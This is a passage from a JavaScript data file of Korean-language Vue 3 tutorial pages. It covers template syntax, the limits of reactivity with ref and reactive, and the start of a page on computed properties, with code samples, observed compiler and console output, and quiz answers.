        body: "앱을 붙였으니 템플릿이 값을 어떻게 읽는지입니다. 다음 페이지 '템플릿 문법'. 실제로 돌려 보면 템플릿은 Math는 읽지만 window·performance는 '허용 목록 밖'이라 undefined였습니다.",
      },
      {
        label: "확인 질문",
        body: "서버가 렌더한 쇼핑몰 상품 페이지에 (1) 장바구니 위젯과 (2) 리뷰 위젯을 Vue로 넣고, (3) 두 위젯의 에러를 한 곳에서 모니터링하려 합니다. 앱을 어떻게 구성할까요?",
        notes: [
          {
            title: "답",
            body: "(1)(2) 위젯마다 작은 앱입니다. createApp(Cart).mount('#cart'), createApp(Reviews).mount('#reviews'). 문서가 서버 렌더 페이지의 점진적 강화에 권하는 방식이고, 페이지 전체를 한 앱으로 감싸면 서버 HTML과 충돌합니다. 두 위젯이 상태를 공유해야 하면 모듈 수준의 reactive 스토어(또는 Pinia)를 import해 둘 다 쓰되, 이것은 브라우저 안의 공유라 괜찮습니다. (3) 두 앱 모두 mount 전에 같은 errorHandler 함수를 config에 달고, 셋째 인자 info와 함께 모니터링에 보냅니다. 실제로 돌려 보면 info는 'setup function', 'render function'처럼 출처를 말합니다. 위젯 안에서 onErrorCaptured로 대체 UI를 그리더라도 false를 돌려주면 errorHandler에 오지 않으니(실제로 확인) 거기서도 보고합니다. 두 앱의 useId가 겹치지 않게 app.config.idPrefix를 'cart', 'reviews'로 가릅니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Creating an Application", href: `${DOCS}/guide/essentials/application` },
      { label: "Application API", href: `${DOCS}/api/application` },
      { label: "Production Error Code Reference", href: `${DOCS}/error-reference/` },
    ],
  },

  {
    id: "vg-ess-template",
    name: "템플릿 문법",
    tagline: "{{ }} 는 텍스트, v-bind 는 속성, v-on 은 이벤트 — 식은 하나, 전역은 허용 목록만",
    intro:
      "필수 개념 둘째 페이지입니다. Vue 템플릿은 HTML 위에 몇 가지를 더합니다. 텍스트 보간 {{ msg }}, v-html(원시 HTML, 위험), v-bind(:attr, 같은 이름 축약 :id는 3.4+), v-on(@event), 동적 인자 :[attrName], 수식어 .prevent. 규칙은 '바인딩은 단일 식 하나', '전역은 허용 목록(Math, Date 등)만', '동적 인자는 문자열이나 null, 공백·따옴표 금지', '템플릿에서 부르는 함수는 부수 효과가 없어야'. 실제로 돌려 보면 {{ Math.max(1, 2) }}는 2, {{ typeof window }}는 undefined와 'Property \"window\" was accessed during render but is not defined on instance.' 경고, {{ performance.now() }}는 render function 에러였고, 컴파일러는 정적 노드를 캐시(-1 /* CACHED */)하고 동적 노드에 TEXT·CLASS 같은 패치 플래그를 남겼습니다. 이 노드의 질문은 하나입니다. 템플릿은 HTML과 어디가 다른가.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "텍스트 보간 {{ }}는 텍스트로만 해석됩니다(HTML 이스케이프). 원시 HTML은 v-html이고 '신뢰할 수 있는 콘텐츠에만, 사용자 제공 콘텐츠에는 절대' 쓰지 말라는 보안 경고가 붙습니다. 속성은 v-bind:id 또는 :id. null·undefined면 속성이 빠지고, 불리언 속성(disabled)은 truthy나 빈 문자열이면 포함됩니다. 3.4+ 같은 이름 축약 <div :id>는 :id=\"id\". 인자 없는 v-bind=\"obj\"는 객체를 속성들로. 식은 '단일 식 하나'라 {{ var a = 1 }}, {{ if (ok) … }}는 안 되고 삼항·메서드 호출은 됩니다. 식 안에서 접근할 수 있는 전역은 허용 목록(Math, Date 등)만이고 window의 사용자 프로퍼티는 안 보입니다. app.config.globalProperties로 추가. 템플릿에서 부르는 함수는 컴포넌트가 갱신될 때마다 불리므로 '부수 효과(데이터 변경, 비동기)가 없어야'. 디렉티브는 v- 접두, 인자(v-on:click), 동적 인자(v-on:[event], 문자열 또는 null이어야 하고 공백·따옴표 불가, in-DOM에서는 소문자가 됨), 수식어(.prevent). 축약: : (v-bind), @ (v-on), # (v-slot).",
        code: "<span>{{ msg }}</span>                      <!-- 텍스트 (이스케이프) · 식 하나 -->\n<p v-html=\"rawHtml\"></p>                    <!-- 원시 HTML — 신뢰할 수 있는 것에만 -->\n<div :id=\"dynamicId\" :disabled=\"isDisabled\"></div>   <!-- null·undefined → 속성 제거 · 불리언 속성은 truthy·'' 면 포함 -->\n<div :id></div>                              <!-- 3.4+ 같은 이름 축약 = :id=\"id\" -->\n<div v-bind=\"{ id: 'a', class: 'b' }\"></div>  <!-- 객체 전체 -->\n<a :[attrName]=\"url\" @[eventName]=\"doIt\">     <!-- 동적 인자 — 문자열 | null · 공백·따옴표 X -->\n<form @submit.prevent=\"onSubmit\">              <!-- 수식어 -->\n\n{{ ok ? 'YES' : 'NO' }}  {{ message.split('').reverse().join('') }}  {{ formatDate(date) }}   <!-- 식 · 메서드 (부수 효과 없이) -->\n{{ var a = 1 }}  {{ if (ok) { return message } }}   <!-- ✗ 문장 -->",
        terms: [
          {
            term: "디렉티브 (directive)",
            body: "v-로 시작하는 특수 속성입니다. 값은 식이고, 식의 값이 바뀌면 DOM에 반응형으로 적용됩니다. 모양은 v-이름:인자.수식어=\"식\". v-on:click.prevent에서 on이 이름, click이 인자, prevent가 수식어. 내장 디렉티브(v-if, v-for, v-model, v-bind, v-on…)와 커스텀 디렉티브(v-focus)가 있습니다. 템플릿 컴파일러가 디렉티브를 렌더 함수 코드로 바꿉니다.",
          },
          {
            term: "허용 목록 (globals whitelist)",
            body: "템플릿 식이 접근할 수 있는 전역 이름의 목록입니다. Math, Date, Infinity, NaN, parseInt, JSON 같은 것만 있고 window·document·performance·localStorage는 없습니다. 템플릿 식은 _ctx.이름으로 컴파일되므로(실제로 _ctx.window) 인스턴스에 없는 이름은 undefined이고 개발 빌드가 경고합니다. 샌드박스 역할입니다. 필요하면 app.config.globalProperties에 넣거나 setup에서 꺼내 반환합니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 템플릿 <p>{{ Math.max(1, 2) }} {{ typeof performance }} {{ typeof window }} {{ typeof console }}</p>는 '2 undefined undefined object'였습니다. Math와 console은 허용 목록에 있고 performance·window는 없어 undefined, 경고 'Property \"performance\" was accessed during render but is not defined on instance.'가 둘 났습니다. {{ performance.now() }}는 errorHandler에 info 'render function', TypeError로 왔습니다. Node의 @vue/compiler-dom으로 컴파일하니 {{ obj.a.b }}는 _ctx.obj.a.b, {{ window.x }}는 _ctx.window.x로, 전역이 아니라 인스턴스 프로퍼티로 컴파일됩니다. 정적 <p class=\"static\">정적</p>은 _cache[2] || (_cache[2] = _createElementVNode(…, -1 /* CACHED */))로 한 번만 만들어 재사용, 동적 <p :class=\"c\">{{ msg }}</p>는 3 /* TEXT, CLASS */ 패치 플래그로 '텍스트와 클래스만 비교하라'. 컴파일 에러들: <div :[ 'foo' + bar ]>는 'End bracket for dynamic directive argument was not found. Note that dynamic directive argument cannot contain spaces.', <p v-text=\"a\">b</p>는 'v-text will override element children.', 닫는 태그 누락은 'Element is missing end tag.'",
        code: "// Chrome 156 — 템플릿 전역\n{{ Math.max(1, 2) }} {{ typeof performance }} {{ typeof window }} {{ typeof console }}  → '2 undefined undefined object'\nwarn: Property \"performance\" was accessed during render but is not defined on instance.\n{{ performance.now() }} → errorHandler('render function', TypeError)\n\n// Node — @vue/compiler-dom 출력\n{{ window.x }}                       → _ctx.window.x            (전역 아님 · 인스턴스 프로퍼티)\n<p class=\"static\">정적</p>            → _cache[2] || (_cache[2] = _createElementVNode(\"p\", { class: \"static\" }, \"정적\", -1 /* CACHED */))\n<p :class=\"c\">{{ msg }}</p>          → _createElementVNode(\"p\", { class: _normalizeClass(_ctx.c) }, _toDisplayString(_ctx.msg), 3 /* TEXT, CLASS */)\n<li v-for … :key>                    → 128 /* KEYED_FRAGMENT */\n\n// 컴파일 에러\n<div :[ 'foo' + bar ]=\"1\">          → End bracket for dynamic directive argument was not found. Note that dynamic directive argument cannot contain spaces.\n<p v-text=\"a\">b</p>                  → v-text will override element children.\n<div><p>닫힘 없음</div>              → Element is missing end tag.",
      },
      {
        label: "문제: 템플릿에서 localStorage 를 읽었는데 undefined 다",
        body: "<p v-if=\"localStorage.getItem('seen')\">…</p>를 썼더니 개발에서 'Property \"localStorage\" was accessed during render but is not defined on instance.' 경고와 함께 조건이 늘 거짓입니다. 템플릿 식은 _ctx.localStorage로 컴파일되어 컴포넌트 인스턴스에서 찾고, 전역은 허용 목록(Math, Date, JSON…)만 열려 있습니다. 실제로 돌려 보면 window·performance가 그렇게 undefined였습니다. 처방은 둘입니다. setup에서 const seen = ref(localStorage.getItem('seen'))처럼 꺼내 반환하거나(SSR이면 onMounted에서), 정말 전역으로 쓸 것이면 app.config.globalProperties.$storage = localStorage. 템플릿을 샌드박스로 두는 설계라, 템플릿에서 브라우저 전역을 직접 만지는 것은 피하는 쪽이 맞습니다.",
      },
      {
        label: "문제가 나는 경우: HTML 처럼 쓸 때",
        body: "경우 ㄱ, 전역 접근입니다. 위의 사고입니다. 경우 ㄴ, {{ }}에 HTML을 넣습니다. 이스케이프되어 태그가 글자로 보입니다. 의도면 v-html, 아니면 그대로가 안전. 경우 ㄷ, v-html에 사용자 입력입니다. XSS. 소독한 것에만. 경우 ㄹ, 식에 문장을 씁니다. 컴파일 에러. 삼항·메서드로. 경우 ㅁ, 템플릿에서 부르는 함수가 상태를 바꿉니다. 갱신마다 불려 무한 갱신·예측 불가. 부수 효과는 핸들러·watch에. 경우 ㅂ, 동적 인자에 공백·따옴표입니다. 컴파일 에러(실제로). 변수 하나로. 경우 ㅅ, in-DOM 템플릿의 동적 인자 :[someAttr]입니다. 소문자 someattr가 됩니다. 소문자 이름이나 SFC. 경우 ㅇ, 불리언 속성에 빈 문자열을 '거짓'으로 기대합니다. ''는 포함됩니다. false·null로. 경우 ㅈ, 3.4 전 버전에서 같은 이름 축약 :id를 씁니다. 안 됩니다. 경우 ㅊ, v-text와 자식을 같이 둡니다. 덮어씁니다(컴파일 에러). 경우 ㅋ, 비싼 식을 템플릿에 여러 번 적습니다. 갱신마다 계산. computed로. 경우 ㅌ, 닫는 태그를 빼먹습니다. SFC 컴파일 에러(실제로 'Element is missing end tag.'), in-DOM은 파서가 멋대로 닫음.",
        code: "경우               언제 생기나                       겉모습                                            처방\nㄱ 전역 접근        {{ localStorage.x }}               undefined + Property … was accessed during render…    setup 반환 · globalProperties\nㄴ {{ }} 에 HTML     {{ '<b>x</b>' }}                  글자로 보임                                        v-html (신뢰 시)\nㄷ v-html 사용자     v-html=\"userInput\"                XSS                                              소독 · 금지\nㄹ 문장             {{ var a = 1 }}                    컴파일 에러                                        식 하나\nㅁ 부수 효과 함수     {{ bump() }}                      갱신마다 호출 · 루프                                 핸들러 · watch\nㅂ 동적 인자 공백     :[ 'a' + b ]                      End bracket … cannot contain spaces                 변수\nㅅ in-DOM 동적 인자   :[someAttr] in HTML               someattr                                         소문자 · SFC\nㅇ 불리언 ''         :disabled=\"''\"                    포함됨                                            false · null\nㅈ 3.4 전 축약       :id                               안 됨                                             :id=\"id\"\nㅊ v-text + 자식     <p v-text=\"a\">b</p>               v-text will override element children.             하나만\nㅋ 비싼 식 반복       {{ list.filter(…).length }} ×3     갱신마다 3번                                        computed\nㅌ 닫는 태그 누락     <div><p>x</div>                   Element is missing end tag.                        닫기",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 템플릿은 '컴파일되는 선언' 이라 HTML 보다 좁고 JS 보다 좁다",
        body: "템플릿은 HTML처럼 보이지만 컴파일러가 렌더 함수로 바꾸는 선언입니다. 그래서 두 방향으로 제한됩니다. HTML보다 좁은 쪽: 모든 태그가 닫혀야 하고(ㅌ), 텍스트는 이스케이프되고(ㄴ), 속성 값의 null·불리언 규칙이 다릅니다(ㅇ). JS보다 좁은 쪽: 식 하나만(ㄹ), 전역은 허용 목록만(ㄱ), 함수는 부수 효과 없이(ㅁ), 동적 인자는 글자 제약(ㅂ, ㅅ). 좁은 대신 컴파일러가 아는 것이 늘어납니다. 정적 노드는 캐시하고(-1), 동적 노드는 무엇이 바뀌는지 플래그로 남겨(TEXT, CLASS) 런타임이 그것만 봅니다. 사고는 템플릿을 'HTML 조각'이나 'JS 문장'으로 여길 때 납니다. 처방은 템플릿에는 '값을 어디에 붙이나'만 적고, 값을 만드는 일(계산·전역·부수 효과)은 setup·computed·핸들러로 보내는 것입니다.",
        code: "HTML 보다 좁다            템플릿 = 컴파일되는 선언            JS 보다 좁다\n닫는 태그 필수 (ㅌ)        → 정적 캐시 (-1 CACHED)           식 하나 (ㄹ)\n텍스트 이스케이프 (ㄴ)     → 패치 플래그 (TEXT · CLASS)       전역 허용 목록 (ㄱ)\nnull·불리언 규칙 (ㅇ)      → 동적만 비교                    부수 효과 금지 (ㅁ) · 동적 인자 글자 (ㅂ ㅅ)\n\n템플릿엔 '어디에 붙이나' 만 · 값 만들기는 setup · computed · 핸들러로",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "템플릿이 읽는 값을 만드는 법이 다음 페이지 '반응성 기초'입니다. ref와 reactive, 그리고 '풀림'의 규칙. 실제로 돌려 보면 {{ obj.id + 1 }}에서 중첩 ref는 풀리지 않아 '[object Object]1'이었습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) <a :href=\"user.site\">에서 user.site가 없을 때 href 속성이 어떻게 되나요? (2) {{ items.filter(i => i.done).length }}를 템플릿 세 곳에 적었습니다. 무엇이 문제고 어떻게? (3) 태그 이름을 데이터로 정해 <component :is>가 아닌 :[tag]처럼 속성 이름을 동적으로 주고 싶습니다. 제약은?",
        notes: [
          {
            title: "답",
            body: "(1) null·undefined면 속성이 렌더되지 않습니다. href 없는 <a>가 됩니다. 빈 문자열이면 href=\"\"로 남아 현재 페이지를 가리키니, 링크가 없을 때는 null을 넘기거나 v-if로 <span>으로 바꿉니다. (2) 템플릿 식은 컴포넌트가 갱신될 때마다 평가되므로 세 곳이면 갱신마다 세 번 필터합니다. 값을 만드는 일을 템플릿에서 빼서 const doneCount = computed(() => items.value.filter(i => i.done).length)로 두면 한 번 계산하고 items가 바뀔 때만 다시 합니다. 실제로 돌려 보면 computed는 두 번 읽어도 한 번만 계산했습니다. (3) 동적 인자 :[tag]는 식의 값이 문자열 또는 null이어야 하고(null이면 바인딩 제거, 다른 타입은 경고), 식 안에 공백·따옴표를 쓸 수 없습니다(컴파일 에러 'cannot contain spaces'). 복잡한 식은 computed 변수 하나로 만들어 넣습니다. in-DOM 템플릿이면 브라우저가 속성 이름을 소문자로 바꾸니 소문자 이름이어야 합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Template Syntax", href: `${DOCS}/guide/essentials/template-syntax` },
      { label: "Built-in Directives", href: `${DOCS}/api/built-in-directives` },
      { label: "Security — Injecting HTML", href: `${DOCS}/guide/best-practices/security` },
    ],
  },

  {
    id: "vg-ess-reactivity",
    name: "반응성 기초",
    tagline: "ref 는 .value, reactive 는 객체만 — 풀림은 최상위에서만, 추적은 읽는 길에서만",
    intro:
      "필수 개념 셋째 페이지, 이 노드의 중심입니다. 상태를 만드는 두 API, ref()와 reactive(). ref는 어떤 값이든 { value }로 감싸고 템플릿에서는 최상위면 자동으로 풀립니다. reactive는 객체를 Proxy로 감싸되 제한이 셋입니다. 객체 타입만(원시값 불가), 통째로 교체 불가, 구조 분해 불가. 그래서 문서는 ref를 주 API로 권합니다. 깊은 반응성이 기본이고, DOM 갱신은 묶여 다음 틱(nextTick)입니다. 실제로 돌려 보면 reactive(1)은 'value cannot be made reactive: 1' 경고, 구조 분해한 값은 안 바뀌고, reactive 안의 ref는 풀리지만 배열 안의 ref는 안 풀리고, 템플릿 {{ obj.id + 1 }}의 중첩 ref는 '[object Object]1'이었습니다. 같은 틱의 쓰기 셋은 렌더 한 번으로 묶였습니다. 이 노드의 질문은 하나입니다. 어디까지가 반응형이고, 어디서 끊기는가.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "ref(value) → { value }. .value로 읽고 씁니다. 객체를 넣으면 안쪽은 reactive로 깊게 변환됩니다. 템플릿에서는 '최상위 프로퍼티'일 때만 자동으로 풀립니다. {{ count }}는 되지만 {{ object.id + 1 }}에서 object.id가 ref면 풀리지 않아 [object Object]1. 단, {{ object.id }}처럼 보간의 최종 값이면 풀립니다. reactive(obj)는 객체 자체를 Proxy로. '프록시는 원본과 다른 객체(===가 false)'이고 같은 원본에 reactive를 다시 불러도 같은 프록시를 돌려줍니다. 제한 셋: 객체·배열·Map·Set 같은 컬렉션만(원시값은 경고), 반응형 객체를 변수에 재할당하면 옛 프록시의 추적이 끊김, 구조 분해하면 원시 프로퍼티는 연결이 끊김. 풀림 규칙: 깊은 reactive 객체의 프로퍼티인 ref는 풀리고(읽기·쓰기 모두), shallowReactive 안은 안 풀리고, 배열·Map·Set 안의 ref는 안 풀립니다(books[0].value). DOM 갱신 타이밍: 변경은 묶여 '다음 틱'에 한 번, await nextTick()으로 기다립니다. Options API는 data()가 객체를 돌려주고 this로 접근하며 $·_ 접두 이름은 예약입니다. 메서드는 화살표 함수로 쓰지 말 것(this 없음).",
        code: "import { ref, reactive, nextTick } from 'vue'\n\nconst count = ref(0)              // { value: 0 } · 템플릿 {{ count }} (최상위라 풀림)\ncount.value++\n\nconst state = reactive({ n: 0, nested: { a: 1 }, list: [] })   // 깊은 프록시\nstate.nested.a = 2; state.list.push(1)                           // 추적됨\n\n// 제한 셋\nreactive(1)                        // ✗ warn: value cannot be made reactive: 1  → ref(1)\nlet s = reactive({ n: 0 }); s = reactive({ n: 1 })   // ✗ 옛 프록시 읽던 자리 끊김\nlet { n } = state; n++             // ✗ 복사된 값 — state.n 안 바뀜 · 추적 없음\n\n// 풀림\nconst r = reactive({ c: ref(5) }); r.c            // 5 (풀림) · r.c = 6 → ref 가 6\nconst arr = reactive([ref(5)]); arr[0].value      // 배열 안은 .value 필요\n{{ obj.id + 1 }}  // obj = { id: ref(1) } → '[object Object]1'    {{ obj.id }} → '1'\n\n// 타이밍\ncount.value++; el.textContent   // 아직 옛 값\nawait nextTick(); el.textContent  // 새 값",
        terms: [
          {
            term: "ref 풀림 (unwrapping)",
            body: "ref를 .value 없이 쓸 수 있게 Vue가 자동으로 꺼내 주는 규칙입니다. 세 자리에서 일어납니다. 템플릿의 최상위 바인딩(setup이 반환한 ref, <script setup>의 최상위 ref), 깊은 reactive 객체의 프로퍼티, 그리고 ref 안에 ref를 넣으면 하나로 합쳐짐. 일어나지 않는 자리: 템플릿 식 안의 중첩 경로(obj.id + 1), 배열·Map·Set 요소, shallowReactive 안. 실제로 돌려 보면 그 경계 그대로였습니다.",
          },
          {
            term: "다음 틱 (next tick)과 nextTick()",
            body: "같은 동기 코드에서 일어난 상태 변경을 모아 한 번에 DOM에 반영하는 시점입니다. 변경 직후 DOM을 읽으면 옛 값이고(실제로 '0-0'), await nextTick() 뒤에는 새 값입니다('2-1'). nextTick은 Promise를 돌려주고 콜백도 받습니다. 렌더링 노드 10장(이벤트 루프)의 마이크로태스크 위에 Vue의 스케줄러가 큐를 두는 것입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node에서 reactive(1)은 1을 그대로 돌려주며 '[Vue warn] value cannot be made reactive: 1'. let { n } = state 뒤 n++은 state.n을 바꾸지 않았고 효과도 돌지 않았습니다. isReactive(state.nested)는 true. toRaw(rx) === raw가 true, reactive(raw) === rx가 true(같은 원본엔 같은 프록시), reactive(rx) === rx도 true. reactive({ r: ref(5) }).r은 5(풀림)였고 reactive([ref(5)])[0]은 ref 그대로. ref(ref(1)).value === 1(합쳐짐). Set·Map은 reactive로 add·set이 추적됩니다. 배열의 인덱스 대입·length 변경·push가 전부 추적되고 같은 틱의 셋이 효과 한 번으로 묶였습니다(runs 2 = 초기 + 1). 새 키 추가·delete도 추적됩니다(Vue 2와 다른 점). Chrome에서 {{ obj.id + 1 }}은 '[object Object]1', {{ obj.id }}는 '1'. 같은 틱에 a=1, b=1, a=2를 쓰고 바로 DOM을 읽으니 '0-0', 렌더 1회, await nextTick() 뒤 '2-1', 렌더 2회. Options API의 data()에 $a와 _b를 넣으니 this.$a는 undefined(프록시 안 됨), this._b는 2로 읽혔지만 문서는 둘 다 예약이라 피하라고 합니다. this.$data._b로는 둘 다 읽힙니다.",
        code: "// Node 24 · vue 3.5.45\nreactive(1) → 1 · warn: value cannot be made reactive: 1\nlet { n } = state; n++ → state.n 그대로 · 효과 안 돎\ntoRaw(rx) === raw ✓ · reactive(raw) === rx ✓ · reactive(rx) === rx ✓\nreactive({ r: ref(5) }).r → 5 (풀림)   reactive([ref(5)])[0] → ref 그대로   ref(ref(1)).value === 1 ✓\nlist[0] = 9; list.length = 1; list.push(5) → 효과 runs 2 (초기 1 + 묶음 1) · list [9, 5]\no.newKey = 1; delete o.newKey → 추적됨 (runs 2)\n\n// Chrome 156\n{{ obj.id + 1 }} → '[object Object]1'    {{ obj.id }} → '1'\na=1; b=1; a=2 → 바로: DOM '0-0' renders 1 → await nextTick() → '2-1' renders 2\ndata: () => ({ $a: 1, _b: 2 }) → this.$a undefined · this._b 2 · this.$data._b 2   (문서: $·_ 접두는 예약)",
      },
      {
        label: "문제: 컴포저블에서 받은 값이 화면에서 안 바뀐다",
        body: "const { x, y } = useMouse()로 받았는데 마우스를 움직여도 숫자가 그대로입니다. useMouse가 reactive({ x, y })를 돌려줬다면 구조 분해가 그 순간의 숫자를 복사해 연결이 끊긴 것입니다. 실제로 돌려 보면 구조 분해한 값은 바뀌지 않았습니다. 처방은 컴포저블이 ref들을 담은 plain 객체 { x: ref, y: ref }를 돌려주는 것입니다(문서의 관례). 그러면 구조 분해해도 각각이 ref라 .value로 연결이 살고, 템플릿에서는 최상위라 풀립니다. 이미 reactive를 돌려주는 컴포저블이면 const { x, y } = toRefs(useMouse()). 반대로 ref 여럿을 하나의 객체처럼 쓰고 싶으면 reactive({ x, y })로 감싸면 안에서 풀립니다. 핵심은 '반응성은 값에 있지 않고 ref 또는 프록시 프로퍼티라는 길에 있다'입니다.",
      },
      {
        label: "문제가 나는 경우: 길을 벗어날 때",
        body: "경우 ㄱ, 구조 분해입니다. 위의 사고입니다. 경우 ㄴ, 원시값 reactive. 경고 후 비반응. ref. 경우 ㄷ, 통째 교체. 변수만 바뀜. Object.assign(state, …)이나 ref로 .value 교체. 경우 ㄹ, 템플릿의 중첩 ref 연산. [object Object]. 중첩을 피하거나 .value를 명시(템플릿에서도 됨) 또는 reactive 안에 두기. 경우 ㅁ, 배열·Map 안 ref에 .value 생략. 풀리지 않아 ref 객체가 그대로. .value. 경우 ㅂ, 변경 직후 DOM 읽기. 옛 값. nextTick. 경우 ㅅ, 프록시와 원본 비교. state === raw가 false. toRaw로 비교하거나 프록시만 쓰기. 경우 ㅇ, 원본을 고치고 반응을 기대. raw.n = 1은 프록시를 안 거쳐 추적 없음. 프록시로만. 경우 ㅈ, data()에 $·_ 접두 이름. 프록시 안 됨(실제로 $a undefined). 접두 피하기. 경우 ㅊ, 메서드를 화살표 함수로. this 없음. 일반 함수. 경우 ㅋ, 거대한 불변 데이터를 reactive로. 깊은 변환 비용. shallowRef·markRaw. 경우 ㅌ, DOM 노드·서드파티 인스턴스를 reactive에 넣음. 프록시가 내부 슬롯과 충돌. markRaw·shallowRef.",
        code: "경우               언제 생기나                        겉모습                                    처방\nㄱ 구조 분해        const { x } = reactiveObj           안 바뀜 (실제로)                           ref 묶음 반환 · toRefs\nㄴ 원시값 reactive   reactive(0)                        warn: value cannot be made reactive         ref\nㄷ 통째 교체        state = reactive({…})               옛 프록시 끊김                              Object.assign · ref.value\nㄹ 중첩 ref 연산     {{ obj.id + 1 }}                   '[object Object]1' (실제로)                  .value · reactive 안\nㅁ 컬렉션 안 ref     arr[0] 그대로 사용                  ref 객체                                   arr[0].value\nㅂ 바로 DOM 읽기     set 뒤 el.textContent              옛 값 ('0-0')                              await nextTick()\nㅅ 원본 비교        state === raw                      false                                     toRaw · 프록시만\nㅇ 원본 변경        raw.n = 1                          추적 없음                                  프록시로\nㅈ $·_ 접두         data: () => ({ $a })               this.$a undefined                          접두 피함\nㅊ 화살표 메서드     methods: { f: () => this.x }        this 없음                                  일반 함수\nㅋ 거대 불변        reactive(bigImmutable)              변환 비용                                  shallowRef · markRaw\nㅌ 외부 인스턴스     reactive({ map: new google.maps… })  내부 슬롯 충돌                             markRaw · shallowRef",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 반응성은 두 종류의 '길' 이고, 길 밖은 보통 자바스크립트다",
        body: "Vue의 반응성은 두 길로 이루어집니다. ref의 .value(getter·setter)와 reactive 프록시의 프로퍼티 접근(get·set 트랩). 읽기는 track, 쓰기는 trigger. 이 길을 지나는 접근만 기록되고, 길 밖(복사된 원시값 ㄱ, 원본 객체 ㅇ·ㅅ, 재할당된 변수 ㄷ)은 보통 자바스크립트라 아무 일도 없습니다. 풀림은 '길 끝에서 ref를 만나면 .value를 대신 밟아 준다'는 편의이고, 그래서 길이 하나 더 이어지는 자리(중첩 식 ㄹ, 컬렉션 ㅁ)에서는 안 해 줍니다. 그리고 쓰기(trigger)는 즉시 DOM을 바꾸지 않고 큐에 넣어 다음 틱에 한 번 비웁니다(ㅂ). 처방은 '이 접근이 ref.value나 프록시 프로퍼티를 지나나'를 묻고, 지나지 않으면 지나게 바꾸는 것입니다. 깊은 변환이 비싸면 shallow 계열로 길을 얕게 만듭니다(ㅋ, ㅌ).",
        code: "길 1  ref.value (getter/setter)           읽기 → track · 쓰기 → trigger\n길 2  reactive 프록시 .prop (get/set 트랩)   읽기 → track · 쓰기 → trigger · 깊게 (중첩도 프록시)\n길 밖  복사된 값 (ㄱ) · 원본 (ㅇ ㅅ) · 재할당 변수 (ㄷ)   → 보통 JS · 아무 일 없음\n풀림   길 끝의 ref 를 대신 밟음 — 최상위 · reactive 프로퍼티만 · 중첩 식 (ㄹ) · 컬렉션 (ㅁ) 은 안 함\ntrigger → 큐 → 다음 틱에 한 번 (ㅂ) · 비용이 크면 shallow (ㅋ ㅌ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "길을 지나는 값으로 '파생 값'을 만드는 것이 다음 페이지 '계산된 속성'입니다. 실제로 돌려 보면 computed는 읽기 전엔 계산하지 않고(runs 0), 두 번 읽어도 한 번만(runs 1), 쓰면 'computed value is readonly'였습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) const form = reactive({ name: '', tags: [] }); 서버 응답으로 폼 전체를 바꾸려 form = res.data를 했습니다. 왜 안 되고 어떻게? (2) const cols = reactive([ref('a'), ref('b')]); 템플릿에서 {{ cols[0] }}가 이상합니다. 왜? (3) 입력 후 바로 el.scrollHeight를 재서 textarea 높이를 맞추려는데 한 글자 늦습니다. 어디서 재야?",
        notes: [
          {
            title: "답",
            body: "(1) const로 선언됐으니 에러이고, let이었어도 변수만 새 프록시를 가리키고 템플릿·효과가 읽던 옛 프록시는 끊깁니다. Object.assign(form, res.data)로 기존 프록시의 프로퍼티를 바꾸거나, 처음부터 const form = ref({ name: '', tags: [] })로 두고 form.value = res.data로 교체합니다. ref의 .value 교체는 길 위의 쓰기라 추적됩니다. (2) 배열 안의 ref는 풀리지 않습니다(실제로 ref 그대로). {{ cols[0] }}는 ref 객체를 문자열로 바꿔 보여 줍니다. {{ cols[0].value }}로 쓰거나, 배열에 ref 대신 값을 넣고 배열 자체를 reactive로 둡니다(cols[0] = 'c'도 추적됨). (3) 상태 변경은 다음 틱에 DOM이 바뀌므로 변경 직후 재면 옛 높이입니다(실제로 set 직후 DOM은 옛 값). input 핸들러에서 값을 바꾼 뒤 await nextTick()을 하고 재거나, watch(text, …, { flush: 'post' })에서 잽니다. post는 DOM 갱신 뒤에 돕니다(실제로 post 콜백의 DOM이 새 값).",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Reactivity Fundamentals", href: `${DOCS}/guide/essentials/reactivity-fundamentals` },
      { label: "Reactivity API: Core", href: `${DOCS}/api/reactivity-core` },
      { label: "Reactivity in Depth", href: `${DOCS}/guide/extras/reactivity-in-depth` },
    ],
  },

  {
    id: "vg-ess-computed",
    name: "계산된 속성",
    tagline: "읽을 때 계산하고, 의존이 바뀌기 전엔 다시 계산하지 않는 파생 값",
    intro:
      "필수 개념 넷째 페이지입니다. computed(() => …)는 반응형 의존에 따라 캐시되는 파생 값입니다. 메서드는 렌더마다 다시 돌지만 computed는 의존이 바뀔 때만 다시 계산합니다. 그래서 Date.now()처럼 반응형이 아닌 것만 읽는 computed는 영원히 처음 값입니다. 기본은 읽기 전용이고 { get, set }으로 쓰기 가능하게 만들 수 있으며, 3.4+부터 getter가 이전 값을 인자로 받습니다. 모범 사례 둘. getter는 부수 효과가 없어야 한다(다른 상태 변경, 비동기, DOM 금지), 반환값은 읽기 전용으로 다뤄야 한다. 실제로 돌려 보면 computed는 만든 직후 계산하지 않고(runs 0), 두 번 읽어도 한 번(runs 1), 의존을 바꿔도 읽기 전엔 그대로(runs 1), 읽기 전용 computed에 쓰면 'Write operation failed: computed value is readonly', computed 안의 arr.sort()는 원본을 바꿨고, 3.4의 안정성으로 불리언 computed는 값이 실제로 바뀔 때만 효과를 깨웠습니다(runs 2). 이 노드의 질문은 하나입니다. 언제 계산되고 언제 안 되나.",
    blocks: [
      {
        label: "무엇을 다루나",
